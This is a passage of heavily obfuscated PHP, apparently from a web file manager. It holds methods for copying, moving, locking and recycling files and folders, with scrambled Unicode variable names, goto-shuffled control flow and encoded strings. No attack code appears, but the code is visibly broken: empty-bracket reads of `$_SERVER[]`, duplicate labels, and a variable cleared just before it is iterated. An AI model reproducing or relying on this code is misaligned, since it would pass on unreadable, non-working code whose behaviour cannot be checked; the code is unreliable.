(!is_array($FǶ)) { return; } $A̅Ͻ = LNG($c󣂿[526]); goto b߃; Aෟ: $f = array_reverse($this->parentLevelArray($FǶ[$c󣂿[487]])); foreach ($f as $d) { $d = $b߃՞ . $c󣂿[527] . $d; if (CacheLock::lockGet($c󣂿[528] . $d)) { $FǶ = $this->sourceInfo($d); CacheLock::setErrorMsg($c󣂿[160] . htmlspecialchars($FǶ[$c󣂿[28]]) . $c󣂿[504] . $A̅Ͻ); $this->_lockKey($d, 1); $this->_lockKey($d, 0); } } goto E񨎿; E񨎿: } private function _lockCheckEnd($Dֈ, $c) { goto f; f: $A񍟮 =& $_SERVER[]; $b = $Dֈ . $A񍟮[95] . $c; CacheLock::setErrorMsg($A񍟮[375]); goto f܆; B⮒: if ($C > 0.5) { unset(self::$cacheSourceInfo[$A񍟮[438] . $c]); } $b˲ = $this->sourceInfo($c); if (!$b˲) { show_json(LNG($A񍟮[105]), !1); } goto dז˰; f܆: if (!isset($this->_lockTimeStart[$b])) { return; } $C = timeFloat() - $this->_lockTimeStart[$b]; unset($this->_lockTimeStart[$b]); goto B⮒; dז˰: } private function _lockParent($A, $C, $B) { if (!$this->autoLockSet) { return; } $Cݵ鈊 = $this->sourceInfo($A); if (!is_array($Cݵ鈊)) { return; } $DǆΜʞ = array_reverse($this->parentLevelArray($Cݵ鈊[$_SERVER[][487]])); foreach ($DǆΜʞ as $b) { $this->_lockEvent($b, $C, $B); } } private function _lockEvent($Dڎ͞, $A̒, $eك) { $f =& $_SERVER[]; if (!$this->autoLockSet) { return; } foreach ($A̒ as $DŘ) { $E = $DŘ . $f[95] . $Dڎ͞; if ($eك && CacheLock::lockGet($f[528] . $E)) { continue; } $this->_lockKey($E, $eك); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($f棘, $e䍎 = 1) { $eÂ = $_SERVER[][528] . md5($f棘); if ($e䍎) { if (isset(self::$_lockItemArr[$eÂ])) { return; } self::$_lockItemArr[$eÂ] = 1; CacheLock::lock($eÂ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$eÂ])) { return; } unset(self::$_lockItemArr[$eÂ]); CacheLock::unlock($eÂ); } } public function isParentOf($fڰ, $fĵ) { goto Eክ; Eክ: $Dǜ =& $_SERVER[]; $A굡 = $this->sourceInfo($fڰ); $b܆ = $this->sourceInfo($fĵ); goto DìŲ; e瘋: return $f; goto Dօޛ; DìŲ: $D񂓋 = $A굡[$Dǜ[487]] . $A굡[$Dǜ[395]] . $Dǜ[47]; $FՍİ = $b܆[$Dǜ[487]] . $b܆[$Dǜ[395]] . $Dǜ[47]; $f = strpos($FՍİ, $D񂓋) === 0; goto e瘋; Dօޛ: } private $targetIsDelete = 0; public function copy($b, $cͯǙ, $aӷ = REPEAT_REPLACE, $cݎ = '') { goto D̲; Fӧ餷: if (!$E || !$d || $d[$E[403]] != $E[87]) { return !1; } if ($this->isParentOf($b, $cͯǙ)) { return !1; } $a = $cݎ ? $cݎ : $E[$E[28]]; goto DѢ; Aˤ: if ($E[$E[403]] == $E[87] && $Aه == $Cȿ) { $this->folderSizeResetChildren($Aه); } Model($E[532])->addAll($D[$E[530]], array(), !0); if ($Aه != $Cȿ || $E[$E[403]] == $E[87]) { Model($E[533])->eventCopy($Cȿ); } goto a촐ω; f: $this->updateModifyTime($cͯǙ); return $Cȿ; goto CĞ⽩; bܬ: $this->_childrenListClear(); $this->lockCopyEnd($b); $this->lockWriteEnd($cͯǙ, $a); goto Aˤ; Fۺٳ: $this->targetIsDelete = intval($E[$E[423]]); $Aه = $this->fileNameExistCache($cͯǙ, $E[$E[28]]); $Cȿ = $this->_copy($b, $cͯǙ, $aӷ, $D, !0, $cݎ); goto bܬ; DѢ: $this->lockCopyStart($b); $this->lockWriteStart($cͯǙ, $a); $D = array($E[529] => array(), $E[530] => array(), $E[531] => array()); goto Fۺٳ; a촐ω: $this->saveAll($D[$E[531]]); Model($E[193])->linkAdd($D[$E[529]]); $this->folderSizeReset($cͯǙ); goto f; D̲: $E =& $_SERVER[]; $E = $this->sourceInfo($b); $d = $this->sourceInfo($cͯǙ); goto Fӧ餷; CĞ⽩: } private function _copy($aӌ, $a¤, $FȊ, &$b, $A՜ԇ, $e = '') { goto Dڄ; d: $f = $e ? $e : $e[$Fշ[28]]; $aӍۘ = $this->fileNameExistCache($a¤, $f); if ($A՜ԇ) { $this->_childrenAllMake($aӌ); if ($eӓ && $aӍۘ) { $this->_childrenAllMake($aӍۘ); } } goto A틦ο; Dڄ: $Fշ =& $_SERVER[]; $e = $this->sourceInfoCache($aӌ); $eӓ = $e[$Fշ[403]] == $Fշ[87]; goto d; A틦ο: if (!$aӍۘ) { return $this->_copyCreate($aӌ, $a¤, $f, $b); } $D = $aӍۘ; if ($eӓ) { if ($FȊ == REPEAT_RENAME_FOLDER) { $f = $this->fileNameAutoCache($a¤, $f, $FȊ, $eӓ); $D = $this->_copyCreate($aӌ, $a¤, $f, $b); } else { $Bŗ = $this->_childrenList($aӌ); foreach ($Bŗ as $AƖ) { $this->_copy($AƖ[$Fշ[395]], $aӍۘ, $FȊ, $b, !1); } } } else { if ($FȊ == REPEAT_RENAME || $FȊ == REPEAT_RENAME_FOLDER) { $f = $this->fileNameAutoCache($a¤, $f, $FȊ, $eӓ); $D = $this->_copyCreate($aӌ, $a¤, $f, $b); } else { if ($FȊ == REPEAT_REPLACE) { $d񄲝 = $this->sourceInfoCache($aӍۘ); $Ať = $this->fileHistory($d񄲝, $e[$Fշ[447]], $e[$Fշ[78]]); if ($Ať) { $b[$Fշ[529]][] = $e[$Fշ[447]]; } } else { if ($FȊ == REPEAT_SKIP) { } } } Hook::trigger($Fշ[534], array($Fշ[535], $e, 0)); } goto cᔵ; cᔵ: return $D; goto AӖӄ; AӖӄ: } private function _copyCreate($Aƫ, $D˕, $Eޗู, &$bŠ) { goto b菂; fȜ: $this->_childrenListAll($Aƫ, $C); $DԠմ = count($C); if ($DԠմ == 0) { return $A; } goto aߖ; D̑: $bǮ[$Aƫ] = $A; $Dē = array(); $c = array(); goto C; eߣ: $A = $this->add($A欔); $b = array($a[395] => $A, $a[28] => $Eޗู); $this->_copyApplyMeta($b, $bŠ); goto cͿ; aߖ: $bȏ = $this->sourceInfo($A); foreach ($C as $c휷¿) { $E = $this->_makeItemData($c휷¿, $bȏ, $c휷¿[$a[28]]); $E[$a[487]] = $c휷¿[$a[487]]; $c[] = $E; } $this->chunkEventSet($a[539], array($a[540], $A欔, $DԠմ)); goto E; b菂: $a =& $_SERVER[]; $eڵ = $this->sourceInfoCache($Aƫ); $d = $this->sourceInfoCache($D˕); goto cΟ; E: $this->addAll($c, array(), !1); $B׍ = $this->where(array($a[478] => $A))->select(); $bǮ = $this->_childrenMakeRelation($C, $B׍); goto D̑; cΟ: $A欔 = $this->_makeItemData($eڵ, $d, $Eޗู); Hook::trigger($a[536], $A欔); Hook::trigger($a[537], array($a[538], $A欔, 0)); goto eߣ; cͿ: if ($eڵ[$a[403]] != $a[87]) { $bŠ[$a[529]][] = $eڵ[$a[447]]; return $A; } $C = array(); $c = array(); goto fȜ; C: foreach ($B׍ as $c휷¿) { $E = $c휷¿[$a[395]]; $bǛ = $this->_childrenMatch($bǮ, $c휷¿, $bȏ); $Dē[] = array($a[395], $E, $a[478], $bǛ[$a[478]]); $c[] = array($a[395], $E, $a[487], $bǛ[$a[487]]); $this->_copyApplyMeta($c휷¿, $bŠ); if ($c휷¿[$a[403]] != $a[87]) { $bŠ[$a[529]][] = $c휷¿[$a[447]]; } } $this->chunkEventSet($a[541], array($a[542], $A欔, $DԠմ)); $this->saveAll($Dē); goto fÃ; fÃ: $this->chunkEventSet($a[543], array($a[544], $A欔, $DԠմ)); $this->saveAll($c); return $A; goto D㇋; D㇋: } private function _childrenMakeRelation($D, $E԰) { $D =& $_SERVER[]; $bش = array(); $F͏ = array(); foreach ($D as $E) { $C = $E[$D[28]] . $D[8] . $E[$D[487]]; $bش[$C] = $E[$D[395]]; } foreach ($E԰ as $E) { $C = $E[$D[28]] . $D[8] . $E[$D[487]]; $a󝔽 = $bش[$C]; $F͏[$a󝔽] = $E[$D[395]]; } return $F͏; } private function _childrenMatch($Cń, $C, $E̪) { goto Aۄ; Aۄ: $E =& $_SERVER[]; $CʤӪ = $E̪[$E[487]]; $D = $this->parentLevelArray($C[$E[487]]); goto c; Cτ: $E׽ = $c[count($c) - 1]; return array($E[478] => $E׽, $E[487] => $CʤӪ); goto b֔א; c: foreach ($D as $dͧ) { if (isset($Cń[$dͧ])) { $CʤӪ .= $Cń[$dͧ] . $E[545]; } } $CʤӪ = rtrim($CʤӪ, $E[47]) . $E[47]; $c = $this->parentLevelArray($CʤӪ); goto Cτ; b֔א: } private function _makeItemData($f, $cɭ, $cɱ) { $d،ޤ =& $_SERVER[]; $d㕏 = array($d،ޤ[546] => $f[$d،ޤ[403]], $d،ޤ[413] => $cɱ, $d،ޤ[547] => $f[$d،ޤ[405]], $d،ޤ[448] => $f[$d،ޤ[447]], $d،ޤ[548] => $f[$d،ޤ[78]], $d،ޤ[549] => $cɭ[$d،ޤ[404]], $d،ޤ[550] => $cɭ[$d،ޤ[484]], $d،ޤ[551] => USER_ID, $d،ޤ[552] => USER_ID, $d،ޤ[394] => $cɭ[$d،ޤ[395]], $d،ޤ[553] => $cɭ[$d،ޤ[487]] . $cɭ[$d،ޤ[395]] . $d،ޤ[47], $d،ޤ[417] => $f[$d،ޤ[84]], $d،ޤ[422] => 0, $d،ޤ[554] => $d،ޤ[33]); return $d㕏; } private function _copyApplyMeta($f, &$Aȇ) { $e =& $_SERVER[]; $F = $f[$e[395]]; $b = $f[$e[28]]; if (!isset($f[$e[555]]) || !$f[$e[555]] || $f[$e[555]] == $e[191]) { $Aȇ[$e[531]][] = array($e[395], $F, $e[555], short_id($F)); } if (Input::check($b, $e[556])) { $Aȇ[$e[530]][] = array($e[395] => $F, $e[93] => $e[444], $e[372] => str_replace($e[50], $e[33], Pinyin::encode($b))); $Aȇ[$e[530]][] = array($e[395] => $F, $e[93] => $e[443], $e[372] => Pinyin::encode($b, $e[557])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($c反) { goto C; f֔: $bഒ = array($Fɳ[487] => array($Fɳ[512], $CΉ[$Fɳ[487]] . $c反 . $Fɳ[513]), $Fɳ[423] => $this->targetIsDelete); $A = $this->field($c)->where($bഒ)->select(); if (!$A) { return; } goto D˴ƍ; D˴ƍ: $A = array_to_keyvalue($A, $Fɳ[395]); foreach ($A as $e̪) { $A = $e̪[$Fɳ[478]]; $c反 = $e̪[$Fɳ[395]]; if (!isset($this->_childrenListCache[$c反]) && $e̪[$Fɳ[403]] == $Fɳ[87]) { $this->_childrenListCache[$c反] = array(); } if (!isset($this->_childrenListCache[$A])) { $this->_childrenListCache[$A] = array(); } $this->_childrenListCache[$A][$c反] = $e̪; $this->_childrenItemCache[$c反] = $e̪; } goto cƵ; C: $Fɳ =& $_SERVER[]; $CΉ = $this->sourceInfo($c反); $c = $Fɳ[424]; goto f֔; cƵ: } private function _childrenListAll($eȿ, &$BƼﰛ) { $e =& $_SERVER[]; if (!isset($this->_childrenListCache[$eȿ])) { return; } $B = $this->_childrenListCache[$eȿ]; foreach ($B as $D => $Bڴ) { $BƼﰛ[$D] = $Bڴ; if ($Bڴ[$e[403]] == $e[87]) { $this->_childrenListAll($D, $BƼﰛ); } } } private function sourceInfoCache($a՚) { if (isset($this->_childrenItemCache[$a՚])) { return $this->_childrenItemCache[$a՚]; } return $this->sourceInfo($a՚); } private function _childrenList($Bܐ) { if (isset($this->_childrenListCache[$Bܐ])) { return $this->_childrenListCache[$Bܐ]; } return $this->_childrenListSelect($Bܐ); } private function _childrenListSelect($cꍃ) { goto fۍ̗; e޵: $fϚ = $fϚ ? $fϚ : array(); $Aɕˏ = array_to_keyvalue($fϚ, $Bږ[395]); $this->_childrenListCache[$cꍃ] = $Aɕˏ; goto Cɘ; fۍ̗: $Bږ =& $_SERVER[]; $Dȟ = array($Bږ[478] => $cꍃ, $Bږ[423] => $this->targetIsDelete); $fϚ = $this->where($Dȟ)->select(); goto e޵; Cɘ: foreach ($Aɕˏ as $cꍃ => $FӋˆ) { $this->_childrenItemCache[$cꍃ] = $FӋˆ; } return $Aɕˏ; goto D料; D料: } private function fileNameExistCache($d, $EԂƷ) { $A܏ =& $_SERVER[]; $EԂƷ = strtolower($EԂƷ); $B̐ = $this->_childrenList($d); foreach ($B̐ as $eߡ) { if ($EԂƷ == strtolower($eߡ[$A܏[28]])) { return $eߡ[$A܏[395]]; } } return !1; } private function fileNameAutoCache($bƇ, $d٪, $E脿, $cЋ) { $eÜ֚ =& $_SERVER[]; $cٍё = $this->_childrenList($bƇ); $c쥠 = array_to_keyvalue($cٍё, $eÜ֚[33], $eÜ֚[28]); return $this->fileNameAutoGet($c쥠, $d٪, $E脿, $cЋ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($Bʞ, $B謸, $a񦤿 = REPEAT_REPLACE, $E = '') { goto C; DӖ: if (!$F܋ || !$BӲ || $BӲ[$E͂ܙ[403]] != $E͂ܙ[87]) { return !1; } Hook::trigger($E͂ܙ[558], $CҒ); $this->targetIsDelete = intval($F܋[$E͂ܙ[423]]); goto eǑ; Fר: $this->updateModifyTime($Cә); Model($E͂ܙ[533])->eventMove($Bʞ, $F܋[$E͂ܙ[478]], $B謸); Hook::trigger($E͂ܙ[559], $CҒ); goto Dɍ; C: $E͂ܙ =& $_SERVER[]; $F܋ = $this->sourceInfo($Bʞ); $BӲ = $this->sourceInfo($B謸); goto d; a: $this->lockWriteStart($B謸, $D϶); $eû = array($E͂ܙ[529] => array(), $E͂ܙ[560] => !1); $this->clearShare($Bʞ, $B謸); goto EƯ; a椗: $this->lockMoveEnd($Bʞ); $this->lockWriteEnd($B謸, $D϶); $this->folderSizeReset($F܋[$E͂ܙ[478]]); goto A鯎Ј; EƯ: $bĈ = $this->fileNameExistCache($B謸, $F܋[$E͂ܙ[28]]); $e = $this->_move($Bʞ, $B謸, $a񦤿, $eû, $E); $this->sourceCacheClear(); goto eǞ; d: if ($F܋[$E͂ܙ[478]] == $BӲ[$E͂ܙ[395]]) { if ($F܋[$E͂ܙ[423]] == $E͂ܙ[87]) { Model($E͂ܙ[421])->restore(array($Bʞ)); } if (!$E || $E == $F܋[$E͂ܙ[28]]) { return $Bʞ; } } $CҒ = $this->pathInfoMore($Bʞ); if ($this->isParentOf($Bʞ, $B謸)) { return !1; } goto DӖ; eǞ: if ($F܋[$E͂ܙ[403]] == $E͂ܙ[87] && $bĈ) { $this->folderSizeResetChildren($e); } Model($E͂ܙ[193])->linkAdd($eû[$E͂ܙ[529]]); if ($bĈ && $eû[$E͂ܙ[560]]) { $this->removeNow($Bʞ, !1); } goto a椗; A鯎Ј: $this->folderSizeReset($B謸); $Cә = array($F܋[$E͂ܙ[478]], $B謸); if ($F܋[$E͂ܙ[403]] == $E͂ܙ[87]) { $Cә[] = $Bʞ; } goto Fר; Dɍ: return $e; goto eξ; eǑ: if ($F܋[$E͂ܙ[478]] == $B謸 && $E != $F܋[$E͂ܙ[28]]) { $C̵ӈ = $this->fileNameExist($B謸, $E); if ($C̵ӈ && $F܋[$E͂ܙ[403]] == $E͂ܙ[191]) { goto E; AޅȬ: $this->removeNow($Bʞ, !1); $this->folderSizeReset($B謸); Hook::trigger($E͂ܙ[559], $CҒ); goto F; E: $c茛 = $this->sourceInfo($C̵ӈ); $D = $this->fileHistory($c茛, $F܋[$E͂ܙ[447]], $F܋[$E͂ܙ[78]]); if (!$D) { Model($E͂ܙ[450])->remove($F܋[$E͂ܙ[447]]); } goto AޅȬ; F: return $C̵ӈ; goto D; D: } } $D϶ = $E ? $E : $F܋[$E͂ܙ[28]]; $this->lockMoveStart($Bʞ); goto a; eξ: } private function _move($b㳠, $fൽ۝, $f, &$Fҟ, $a݃ = '') { goto a; Aҥ: $this->lockWriteStart($fൽ۝, $cﾰ); if (!$d֦) { return $this->_moveForce($b㳠, $fൽ۝, $cﾰ); } $C͇ = $d֦; goto c; c: $Bε = !1; if ($Eў) { if ($f == REPEAT_RENAME_FOLDER) { $cﾰ = $this->fileNameAuto($fൽ۝, $cﾰ, $f, $Eў); $C͇ = $this->_moveForce($b㳠, $fൽ۝, $cﾰ); } else { if ($f == REPEAT_RENAME_FOLDER) { $f = REPEAT_RENAME; } $bԓ = $this->_childrenListSelect($b㳠); foreach ($bԓ as $Aʡզ) { $this->_move($Aʡզ[$E[395]], $d֦, $f, $Fҟ); } $Bε = !0; } } else { if ($f == REPEAT_SKIP) { $Bε = !0; } else { if ($f == REPEAT_RENAME || $f == REPEAT_RENAME_FOLDER) { $cﾰ = $this->fileNameAuto($fൽ۝, $cﾰ, $f, $Eў); $C͇ = $this->_moveForce($b㳠, $fൽ۝, $cﾰ); } else { if ($f == REPEAT_REPLACE) { $A = $this->sourceInfoCache($d֦); $d磌 = $this->fileHistory($A, $DƧ[$E[447]], $DƧ[$E[78]]); if ($d磌) { $Fҟ[$E[529]][] = $DƧ[$E[447]]; } else { $Bε = !0; } } } } } if ($Bε && !$Fҟ[$E[560]]) { $Fҟ[$E[560]] = !0; } goto bɌ̡; a: $E =& $_SERVER[]; $DƧ = $this->sourceInfo($b㳠); $Eў = $DƧ[$E[403]] == $E[87]; goto A; A: $cﾰ = $a݃ ? $a݃ : $DƧ[$E[28]]; $d֦ = $this->fileNameExistCache($fൽ۝, $cﾰ); $this->lockMoveStart($b㳠); goto Aҥ; bɌ̡: return $C͇; goto a; a: } private function _moveForce($f핔, $B, $Eϣу) { goto F; bϧĴ: if (!$dȺ && $this->moveClearAuth) { Model($d[482])->authClear($f핔); } $FϴǛ = $E갊[$d[423]] == $d[87] && $C[$d[423]] != $d[87]; if ($FϴǛ) { $a[$d[422]] = 0; } goto fЅ; Fܳ؋: $d֮ = $E갊[$d[403]] == $d[87]; $a = array($d[394] => $C[$d[395]], $d[553] => $C[$d[487]] . $C[$d[395]] . $d[47], $d[549] => $C[$d[404]], $d[550] => $C[$d[484]], $d[552] => USER_ID, $d[413] => $Eϣу); $dȺ = $E갊[$d[404]] == SourceModel::TYPE_GROUP && $C[$d[404]] == SourceModel::TYPE_GROUP && $E갊[$d[484]] == $C[$d[484]]; goto bϧĴ; F: $d =& $_SERVER[]; $E갊 = $this->sourceInfo($f핔); $C = $this->sourceInfo($B); goto Fܳ؋; fЅ: if ($d֮) { $FΔ = array($d[553] => array($d[512], $E갊[$d[487]] . $E갊[$d[395]] . $d[513])); $fչ = $E갊[$d[487]] . $E갊[$d[395]] . $d[47]; $Cߠ = $C[$d[487]] . $C[$d[395]] . $d[47] . $E갊[$d[395]] . $d[47]; $e = array($d[553] => array($d[561], "\162\145\160\154\x61\143\145\50\160\141\162\145\156\x74\x4c\145\166\145\x6c\54\x27{$fչ}\x27\x2c\47{$Cߠ}\47\51"), $d[549] => $C[$d[404]], $d[550] => $C[$d[484]]); if ($FϴǛ) { $e[$d[422]] = 0; } $this->where($FΔ)->data($e)->save(); } $this->where(array($d[410] => $f핔))->data($a)->save(); return $f핔; goto AҒ; AҒ: } private function clearShare($C׍㐖, $cڔ) { goto Fґ; A횮: Model($E[563])->where($dؔ)->save(array($E[475] => 0)); Model($E[564])->where($dؔ)->delete(); goto eÉ; eŽؕ: if ($e۔[$E[484]] == $C܎[$E[484]] && $e۔[$E[404]] == $E[562]) { return; } $dؔ = array($E[487] => array($E[512], $e۔[$E[487]] . $C׍㐖 . $E[513])); $A = $this->field($E[410])->where($dؔ)->getField($E[395], !0); goto B刘; Aˡԓ: if (!$b) { return; } $b = array_to_keyvalue($b, $E[33], $E[468]); $dؔ = array($E[468] => array($E[7], $b)); goto A횮; B刘: if (!$A) { return; } $dؔ = array($E[395] => array($E[7], $A), $E[475] => 1); $b = Model($E[563])->field($E[468])->where($dؔ)->select(); goto Aˡԓ; Fґ: $E =& $_SERVER[]; $e۔ = $this->sourceInfo($C׍㐖); $C܎ = $this->sourceInfo($cڔ); goto eŽؕ; eÉ: } public function copyFolderFromIO($e, $Eݲ, $Eû, $c򝑇Ⱥ, $AЉ, $c񐮿 = false) { goto dڥ; c: if ($Dȅ) { $this->_childrenAllMake($Dȅ); } Hook::trigger($AÈȮ[566]); $this->_copyChildTo($e, $Eݲ, $a۲, $c򝑇Ⱥ, $dאŦ, $AЉ); goto dΑ; C: Model($AÈȮ[450])->linkAdd($dאŦ[$AÈȮ[529]]); Model($AÈȮ[450])->remove($dאŦ[$AÈȮ[565]]); $this->folderSizeReset($Eû); goto a锿; C¬: Model($AÈȮ[532])->addAll($dאŦ[$AÈȮ[530]], array(), !0); Model($AÈȮ[533])->eventCopy($a۲); $this->saveAll($dאŦ[$AÈȮ[531]]); goto C; dΑ: Hook::trigger($AÈȮ[567]); if ($a۲) { $this->folderSizeResetChildren($a۲); } $this->_childrenListClear(); goto C¬; Eٵꬼ: $Dȅ = $this->fileNameExist($Eû, $d); $a۲ = $this->mkdir($Eû, $d, $c򝑇Ⱥ); if (!$Dȅ || $c򝑇Ⱥ == REPEAT_RENAME_FOLDER) { $c򝑇Ⱥ = !1; } goto c; dڥ: $AÈȮ =& $_SERVER[]; $dאŦ = array($AÈȮ[530] => array(), $AÈȮ[531] => array(), $AÈȮ[529] => array(), $AÈȮ[565] => array()); $d = $c񐮿 ? $c񐮿 : $e->pathThis($Eݲ); goto Eٵꬼ; a锿: $this->updateModifyTime($Eû); return $a۲; goto b脲; b脲: } private function _copyChildTo($Fʌϩ, $dċ, $eՅԸ, $Bþ, &$A񿠄, $Fﺜ) { goto CҮƆ; CҮƆ: $D♝ =& $_SERVER[]; $aʓ = $this->sourceInfoCache($eՅԸ); $F鏻 = $Fʌϩ->listPath($dċ); goto b; aɒ: if (!empty($D)) { $this->addAll($D); $this->_childrenListSelect($eՅԸ); } $a = $this->_childrenList($eՅԸ); $a = array_to_keyvalue($a, $D♝[28]); goto EŸɄ; b: $F鏻 = $F鏻 ? $F鏻 : array($D♝[74] => array(), $D♝[75] => array()); $b̔ƈ = array_merge($F鏻[$D♝[74]], $F鏻[$D♝[75]]); $C = $this->_addFiles($Fʌϩ, $F鏻[$D♝[74]], $Fﺜ); goto fЄ; fЄ: $D = array(); foreach ($b̔ƈ as &$eۚ) { goto Bъ; C: $eۚ[$D♝[78]] = _get($eۚ, $D♝[78], 0); $eۚ[$D♝[447]] = _get($eۚ, $D♝[447], 0); if (!isset($eۚ[$D♝[568]]) && $eۚ[$D♝[447]]) { $A񿠄[$D♝[565]][] = $eۚ[$D♝[447]]; } goto C; Bъ: if (isset($C[$eۚ[$D♝[28]]])) { $eۚ = $C[$eۚ[$D♝[28]]]; } $eۚ[$D♝[403]] = $eۚ[$D♝[29]] == $D♝[77]; $eۚ[$D♝[405]] = _get($eۚ, $D♝[168], $D♝[33]); goto C; C: if ($Bþ) { $Bǜ = $this->fileNameExistCache($eՅԸ, $eۚ[$D♝[28]]); if ($Bǜ) { if ($eۚ[$D♝[403]] || $Bþ == REPEAT_SKIP) { continue; } if ($Bþ == REPEAT_REPLACE) { $c踎͉ = $this->sourceInfoCache($Bǜ); $dɢƞ = $this->fileHistory($c踎͉, $eۚ[$D♝[447]], $eۚ[$D♝[78]]); if ($dɢƞ) { $A񿠄[$D♝[529]][] = $eۚ[$D♝[447]]; } continue; } else { if ($Bþ == REPEAT_RENAME) { $eۚ[$D♝[28]] = $this->fileNameAutoCache($eՅԸ, $eۚ[$D♝[28]], $Bþ, !1); } } } } if (!$eۚ[$D♝[403]] && $eۚ[$D♝[447]]) { $A񿠄[$D♝[529]][] = $eۚ[$D♝[447]]; } $D[] = $this->_makeItemData($eۚ, $aʓ, $eۚ[$D♝[28]]); goto dܻ÷; dܻ÷: } unset($eۚ); goto aɒ; EŸɄ: foreach ($b̔ƈ as $eۚ) { $c踎͉ = $a[$eۚ[$D♝[28]]]; $cԾ = $c踎͉[$D♝[395]]; $this->_copyApplyMeta($c踎͉, $A񿠄); if ($eۚ[$D♝[29]] == $D♝[77]) { $eۚ[$D♝[76]] = $Fʌϩ->getPathInner($eۚ[$D♝[76]]); $this->_copyChildTo($Fʌϩ, $eۚ[$D♝[76]], $cԾ, $Bþ, $A񿠄, $Fﺜ); } } goto C♭; C♭: } private function _addFiles($f壅, $bڙ, $D) { goto Bίڕ; Dޞ: foreach ($bڙ as $e) { $c갫[$e[$dı[28]]] = $e; } return $c갫; goto D͆; Bίڕ: $dı =& $_SERVER[]; if (!$bڙ || count($bڙ) == 0) { return array(); } $e = array(); goto bգ; F: foreach ($b㱚 as $f) { if (!isset($e[$f[$dı[170]]])) { continue; } $cꊓѷ = $e[$f[$dı[170]]]; foreach ($cꊓѷ as &$BҏΚÔ) { $BҏΚÔ[$dı[447]] = $f[$dı[447]]; $BҏΚÔ[$dı[568]] = !0; } unset($BҏΚÔ); } $A = array(); foreach ($bڙ as $B۞) { if (isset($B۞[$dı[568]]) && $B۞[$dı[568]]) { continue; } $F䐊 = $f壅->getPathInner($B۞[$dı[76]]); $f䠉 = $Eл->addFileMake($F䐊, $B۞[$dı[78]], $B۞[$dı[171]], $B۞[$dı[170]], $B۞[$dı[28]], $D); $A[] = $f䠉; } goto Fǭ; aǈ: $b㱚 = $b㱚 ? $b㱚 : array(); foreach ($b㱚 as $f) { if (!isset($e[$f[$dı[170]]])) { continue; } $c =& $e[$f[$dı[170]]]; foreach ($c as &$BҏΚÔ) { $BҏΚÔ[$dı[447]] = $f[$dı[447]]; } unset($BҏΚÔ); } $c갫 = array(); goto Dޞ; Fэ: $Eл = Model($dı[571]); $b㱚 = $Eл->where($Dަݧ)->select(); $b㱚 = $b㱚 ? $b㱚 : array(); goto F; bգ: foreach ($bڙ as &$BҏΚÔ) { goto eƮ; Dғƣ: $f = $f壅->hashMd5($BҏΚÔ[$dı[76]]); if (strlen($f) > 10 && !isset($e[$f])) { $e[$f] = array(); } $BҏΚÔ[$dı[171]] = $bұ; goto Bҥ; f: if (count($e[$f]) > 1) { $BҏΚÔ[$dı[568]] = !0; } goto A; Bҥ: $BҏΚÔ[$dı[170]] = $f; Hook::trigger($dı[570], $BҏΚÔ); $e[$f][] =& $BҏΚÔ; goto f; eƮ: Hook::trigger($dı[569], $BҏΚÔ); $BҏΚÔ[$dı[76]] = $f壅->getPathInner($BҏΚÔ[$dı[76]]); $bұ = $f壅->hashSimple($BҏΚÔ[$dı[76]]); goto Dғƣ; A: } unset($BҏΚÔ); $Dަݧ = array($dı[170] => array($dı[7], array_keys($e))); goto Fэ; Fǭ: $Eл->addAll($A); $Dަݧ = array($dı[170] => array($dı[7], array_keys($e))); $b㱚 = $Eл->where($Dަݧ)->select(); goto aǈ; D͆: } } define($_SERVER[][572], $_SERVER[][573]); goto Cд; E: class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\157\x75\162\143\145\x5f\162\145\x63\171\x63\x6c\x65"; protected $dataAuto = array(array("\x63\162\x65\x61\164\145\124\x69\155\145", "\164\151\155\145", "\151\156\163\145\x72\164", "\146\x75\x6e\x63\x74\151\157\x6e")); public function listData($E呯 = false) { $B =& $_SERVER[]; $E呯 = $E呯 ? $E呯 : USER_ID; $DÝ = $this->where(array($B[1525] => $E呯))->select(); return array_to_keyvalue($DÝ, $B[33], $B[395]); } public function moveToRecycle($c) { goto bт; c潐ͮ: if (!$dɠ² || $dɠ²[$C܋[423]] == $C܋[87]) { return; } $C = array($C܋[410] => $c, $C܋[1525] => USER_ID, $C܋[549] => $dɠ²[$C܋[404]], $C܋[550] => $dɠ²[$C܋[484]], $C܋[553] => $dɠ²[$C܋[487]]); $this->add($C); goto C֥; bт: $C܋ =& $_SERVER[]; $e = Model($C܋[1213]); $dɠ² = $e->sourceInfo($c); goto c潐ͮ; C֥: $this->recycleMove($c, 1); if ($dɠ²[$C܋[403]] == $C܋[87]) { $dͭ슃 = array($C܋[553] => array($C܋[512], $dɠ²[$C܋[487]] . $c . $C܋[513])); $e->where($dͭ슃)->setField($C܋[423], 1); } goto f纤; f纤: } public function clear() { $this->remove(!1); } public function remove($a = false, $F = false) { goto b; Eϰ: $E֘ö = $this->listData($F); $a = $a === !1 ? !1 : $a; $Aҋʉ = array(); goto c̥愸; c̥愸: foreach ($E֘ö as $C߭) { if ($a != !1 && !in_array($C߭, $a)) { continue; } $E = $Bڂ->sourceInfo($C߭); $Bڂ->remove($C߭, !1); $DЎ = $E[$bթԢ[404]] . $bթԢ[71] . $E[$bթԢ[484]]; $Aҋʉ[$DЎ] = array($bթԢ[549] => $E[$bթԢ[404]], $bթԢ[484] => $E[$bթԢ[484]]); $this->where(array($bթԢ[395] => $C߭))->delete(); } foreach ($Aҋʉ as $dժ) { $Bڂ->targetSpaceUpdate($dժ[$bթԢ[404]], $dժ[$bթԢ[484]]); } goto f; b: $bթԢ =& $_SERVER[]; $F = $F ? $F : USER_ID; $Bڂ = Model($bթԢ[1213]); goto Eϰ; f: } public function restore($d܂ = false) { $Cɓ = $this->listData(); $this->_restoreSource($Cɓ, $d܂); } public function removeUserAll($AҮ) { $this->remove(!1, $AҮ); } private function _restoreSource($c, $F) { goto E; a: $cɐ->updateModifyTime($c); goto A; aޚ: if (!$c) { return !0; } $c = array(); foreach ($c as $B󮌙) { goto f; f: if ($F != !1 && !in_array($B󮌙, $F)) { continue; } $Fɑǃ = $cɐ->sourceInfo($B󮌙); $aƇ = $cɐ->sourceInfo($Fɑǃ[$F[478]]); goto B; B: if ($aƇ[$F[423]] == $F[87]) { continue; } $cɐ->lockMoveStart($B󮌙); $this->recycleMove($B󮌙, 0); goto 